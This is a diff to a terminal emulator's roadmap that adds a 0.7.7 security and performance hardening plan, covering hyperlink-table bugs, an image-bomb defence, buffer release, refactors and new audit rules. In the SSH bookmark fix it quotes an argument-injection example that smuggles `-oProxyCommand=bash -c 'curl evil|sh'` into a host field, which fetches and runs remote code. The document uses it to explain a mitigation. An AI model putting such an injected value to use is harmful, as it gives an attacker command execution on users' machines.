@@ -708,6 +708,168 @@ the next run.
 
 ---
 
+## 0.7.7 — hardening pass (target: 2026-05)
+
+**Theme:** four-dimensional review (perf / security / bugs / refactor)
+commissioned 2026-04-22 across the full codebase. Findings triaged into
+three cohorts — **(A) shipped in-tree in this release** (the small,
+verified, low-blast-radius fixes that went in before this ROADMAP update
+so 0.7.7 has real content), **(B) 0.7.7 planned work** (medium-scope,
+self-contained), and **(C) deferred to 0.8+** (large refactors and
+architecture-level perf work that deserves its own release arc). Each
+item carries the dimension tag (⚡ perf, 🔒 security, 🐛 bug,
+🧹 refactor) so the release notes can group them.
+
+### 🐛 / 🔒 — Shipped alongside this ROADMAP revision
+
+- ✅ **🐛 `insertLines` / `deleteLines` now sync `m_screenHyperlinks`.**
+  Was: CSI L / CSI M shifted `m_screenLines` rows without moving the
+  parallel OSC 8 hyperlink table, so clickable spans drifted away from
+  the cells containing the link text after any `vim :delete` /
+  `:insert` burst. Now: the same erase/insert pattern runs against
+  `m_screenHyperlinks`, gated on `bottom < m_screenHyperlinks.size()`
+  so under-populated tables (lazy-grow path at
+  `TerminalGrid::addRowHyperlink`) don't throw.
+  Fix in `src/terminalgrid.cpp` (insertLines/deleteLines bodies).
+- ✅ **🐛 Resize clamps `m_hyperlinkStartRow` / `m_hyperlinkStartCol`.**
+  Was: shrinking the grid below the row where an OSC 8 was opened left
+  the start coordinates pointing at a no-longer-existent row — a later
+  grow-back would attach the span to a row whose content no longer
+  matched. Now: both fields are `std::clamp`'d on every resize, same
+  as `m_cursorRow/Col`.
+- ✅ **🔒 SSH bookmark argv-injection hardening (CVE-2017-1000117
+  class).** `SshBookmark::toSshCommand` now inserts `--` before the
+  host argument, stopping OpenSSH from parsing a host whose value
+  begins with `-` as an option (classic
+  `-oProxyCommand=bash -c 'curl evil|sh'` trick). Shell-quoting alone
+  does not defend against this — the shell passes the value correctly
+  but `ssh` itself then re-interprets the leading dash.
+- ✅ **🔒 Image-bomb defence: PNG dimension peek before decode.** Both
+  decode sites (OSC 1337 iTerm2 and Kitty graphics PNG path) now use
+  `QImageReader::size()` to read the PNG header and reject images
+  declaring dimensions over `MAX_IMAGE_DIM` (4096) *before* calling
+  `QImage::loadFromData`. Prevents a 1 KB compressed PNG declaring
+  100 000 × 100 000 from forcing a multi-GB decompression allocation
+  in the millisecond window before the post-decode dimension guard
+  fires. Follows the
+  [Qt6 untrusted-data guidance](https://doc.qt.io/qt-6/untrusteddata.html).
+- ✅ **🔒 OSC/DCS/APC buffer memory release after dispatch.** Was: an
+  attacker who streamed a ~10 MB inline image left three 10 MB
+  `std::string` buffers sitting at full capacity in the VtParser for
+  the lifetime of the process (30 MB permanent overhead per terminal),
+  because `.clear()` doesn't shrink. Now: dispatch does
+  `std::move` into the `VtAction`, then a `releaseIfLarge` helper
+  swap-deallocates when capacity exceeds 64 KB. Normal-traffic buffers
+  stay cheap; adversarial ones don't linger.
+
+### 📋 0.7.7 planned — smallish, self-contained
+
+- 📋 **🐛 Audit-pipeline regression coverage for the fixes above.**
+  Add `tests/features/osc8_insert_delete_lines/` (CSI L / CSI M sync
+  invariant), `tests/features/hyperlink_resize_clamp/`,
+  `tests/features/ssh_dash_host_rejected/` and
+  `tests/features/image_bomb_png_header_peek/` so the 0.7.6 → 0.7.7
+  fixes have the same "fails on pre-fix code" guarantee the rest of
+  `tests/features/` carries.
+- 📋 **⚡ `isCellSearchMatch` — linear scan → `std::lower_bound`.**
+  `terminalwidget.cpp`. `m_searchMatches` is already sorted by
+  `globalLine`; the paint path walks the whole vector per cell.
+  Binary-search to the first match at or after the current global
+  line, then iterate only matches whose `globalLine` equals it.
+  Expected win: 5–20% of paint time on search-highlighted content.
+- 📋 **⚡ `QFontMetrics` hoisted out of the per-cell underline loop.**
+  Construct once per `paintEvent`; cache `underlinePos` and
+  `lineWidth` as member fields refreshed on font change.
+- 📋 **⚡ Selection-bounds normalisation lifted out of `isCellSelected`.**
+  `std::swap` + min/max happen per-cell even though the result is
+  identical for every cell in the frame. Normalise at the top of
+  `paintEvent`; use pre-normalised `sLine, sCol, eLine, eCol` in the
+  inner loop.
+- 📋 **🧹 `writeSecureFile(path, data)` helper.** 12 copies of
+  `file.setPermissions(QFileDevice::ReadOwner | QFileDevice::WriteOwner)`
+  across `config.cpp`, `sessionmanager.cpp` (×2), `claudeallowlist.cpp`,
+  `auditdialog.cpp` (×4), `claudeintegration.cpp` (×2),
+  `remotecontrol.cpp`, `auditrulequality.cpp`. One typo away from
+  leaking an API key. Single inline helper in a new
+  `src/secureio.h`, call sites rewritten.
+- 📋 **🧹 Shared `shellQuote` helper.** Defined in `sshdialog.cpp` and
+  *re-defined as a lambda* in `mainwindow.cpp` — two implementations
+  of the same regex-based single-quote-escaping logic, one of which
+  drifts if the other is fixed. Extract to `src/shellutils.h`.
+
+### 💭 0.8+ deferred — larger scope
+
+- 💭 **⚡ `scrollUp` / `scrollDown` — erase/insert loop → `std::rotate`.**
+  Hot path during every newline in a full-window scroll. Current impl
+  erases `m_screenLines[scrollTop]` and re-inserts at `scrollBottom`
+  inside a `for(i<count)` loop; each erase/insert is O(rows).
+  A single `std::rotate(scrollTop, scrollTop+count, scrollBottom+1)`
+  does the same work in one linear pass. Same transformation applies
+  to the parallel `m_screenHyperlinks` shift. Touches the
+  `newline_stream` corpus in `bench_vt_throughput` — currently 4× slower
+  than pure Print per the 2026-04-20 baseline — so this is the item
+  that will actually move the bench needle.
+- 💭 **⚡ Per-frame `QString` construction in the text-run accumulator.**
+  `QString::fromUcs4()` is called per non-space cell. Accumulate
+  codepoints into a `std::vector<uint32_t>` and construct the run
+  string once at push time.
+- 💭 **⚡ Combining-char map in-place key remap on
+  `deleteChars` / `insertBlanks`.** Current impl reallocates the
+  `unordered_map` per call. Rewrite to iterate + reassign keys without
+  rebuilding.
+- 💭 **🧹 Dialog base class.** `QDialogButtonBox` + accept/reject wiring
+  + window-title/size setup is duplicated across
+  `settingsdialog.cpp`, `aidialog.cpp`, `sshdialog.cpp`,
+  `claudeallowlist.cpp`, `claudeprojects.cpp`, `auditdialog.cpp`.
+  Extract a `DialogBase` with `setupStandardButtons(layout, onApply)`.
+- 💭 **🧹 `ConfigPaths` namespace.**
+  `QDir::homePath() + "/.config/..."` / `"/.claude/..."` patterns
+  appear 12+ times. Centralise so a future XDG-respect pass has one
+  call site to update.
+- 💭 **🧹 `ManagedProcess` (QProcess + timeout + finished-signal
+  boilerplate).** Six copies across `auditdialog.cpp`. One class that
+  owns the timer-and-cleanup dance.
+- 💭 **🔒 IPC-socket `/tmp` fallback path.** `remotecontrol.cpp`
+  defaults to `XDG_RUNTIME_DIR` (correct, 0700 perms) but falls back
+  to `/tmp/ants-terminal-<uid>.sock` when that's empty. The fallback's
+  `removeServer(path)` → `listen(path)` sequence is robust against
+  symlink races in modern Qt, but defence-in-depth: `stat(path)` and
+  refuse to unlink if the target isn't a socket.
+
+### 🔁 Fold-in to the project audit tool
+
+Every finding that is expressible as a repo-wide grep / AST pattern
+becomes a persistent audit rule in `audit_rules.json` — that's how a
+review turns into a regression guard instead of a one-off sweep. This
+release adds three new rules so the hardening sweep leaves behind
+automation, not just diffs:
+
+- `ssh_argv_dash_host` (high) — any ssh(1) argv construction that
+  concatenates a user-controlled host *without* a preceding `--`.
+  Pattern: `args << .*shellQuote.*host` not preceded by `args << "--"`
+  in a window of 3 lines.
+- `qimage_load_without_peek` (medium) — `QImage::loadFromData(...)`
+  calls that aren't preceded by a `QImageReader::size()` peek within
+  3 lines. Catches the next image-bomb entry point.
+- `setPermissions_pair_no_helper` (low / hygiene) — raw
+  `setPermissions(QFileDevice::ReadOwner | QFileDevice::WriteOwner)`
+  calls, prompting the author to use `writeSecureFile()` once that
+  helper lands. Low-severity reminder, not blocking.
+
+These ship in the same release as the `writeSecureFile` helper so
+existing call sites flip from "finding" to "good citizen" in one
+commit. See the [feature-coverage audit lane](CHANGELOG.md#076--2026-04-22)
+work in 0.7.6 for the precedent of "each review leaves a detector
+behind."
+
+### 📚 Prior-art references consulted for this release
+
+- [ANSI Terminal security in 2023 and finding 10 CVEs](https://dgl.cx/2023/09/ansi-terminal-security) — CVE-2022-41322 (Kitty OSC desktop notification), ConEmu CVE-2022-46387 / CVE-2023-39150, iTerm2 CVE-2022-45872 (DECRQSS mishandling); the OSC/DCS/APC buffer-release work above is in the same class.
+- [Qt6 Handling Untrusted Data](https://doc.qt.io/qt-6/untrusteddata.html) — Qt's own warning that `QDataStream` demarshalling operators allocate based on stream-declared sizes with no sanity check; motivates the `QImageReader` size-peek pattern used here and is the reference for a future pass on `SessionManager` deserialisation.
+- [CVE-2017-1000117](https://nvd.nist.gov/vuln/detail/CVE-2017-1000117) — git-ssh argv injection via dash-prefixed host; the ssh-bookmark `--` fix above is a direct port of the mitigation.
+
+---
+
 ## 0.8.0 — multiplexing + marketplace (target: 2026-08)
 
 **Theme:** big new capabilities. This is the "features you'd expect from
